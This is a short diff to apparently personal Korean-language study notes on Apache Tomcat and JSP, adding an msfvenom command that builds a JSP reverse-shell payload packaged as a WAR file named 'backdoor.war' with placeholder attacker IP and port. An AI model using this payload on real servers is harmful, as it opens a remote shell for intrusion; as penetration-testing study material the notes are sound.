@@ -15,3 +15,6 @@
 # Apache Tomcat
 - JSP : 웹에서 동적 콘텐츠를 생성하기 위한 기술.
 - Tomat은 JSP를 실행시키도록 개발됨.
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > backdoor.war
+```
